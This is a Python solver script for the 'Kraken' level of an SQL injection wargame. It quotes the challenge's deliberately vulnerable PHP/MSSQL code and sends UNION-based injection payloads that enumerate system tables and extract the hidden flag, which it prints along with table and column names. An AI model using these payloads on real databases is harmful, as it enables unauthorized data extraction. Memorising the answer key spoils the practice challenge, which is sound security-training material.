#!/usr/bin/env python3
import los


def main():
    '''
    Kraken 45

    if(preg_match('/master|information|;/i', $_GET['id'])) exit("No Hack ~_~");
    if(preg_match('/master|information|;/i', $_GET['pw'])) exit("No Hack ~_~");
    $query = "select id from member where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
    if($result['id']) echo "<h2>{$result['id']}</h2>";

    if($krakenFlag === $_GET['pw']) solve("kraken");
    // Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.
    '''

    url = "https://los.rubiya.kr/chall/kraken_647f3513b94339a4c59cf6f9074d0f92.php"
    cook = los.check_cookies(url)

    param = dict(
        pw="' union select count(name) from sys.sysobjects--")
    los.resp_with_message(url, param, cook, '9')

    param = dict(
        pw="' union select name from sys.sysobjects order by 1 offset 2 rows--")
    los.resp_with_message(url, param, cook, 'flag')

    param = dict(
        pw="' union select id from sys.sysobjects where name='flag_ccdfe62b'--")
    los.resp_with_message(url, param, cook, '901578250')

    param = dict(
        pw="' union select name from sys.all_columns where object_id=901578250--")
    los.resp_with_message(url, param, cook, 'flag')

    param = dict(
        pw="' union select flag_ab15b600 from flag_ccdfe62b--")
    los.resp_with_message(url, param, cook, 'FLAG')

    param = dict(pw='FLAG{a0819fc56beae985bac7d175c974cd27}')
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Kraken Clear!')


if __name__ == '__main__':
    main()


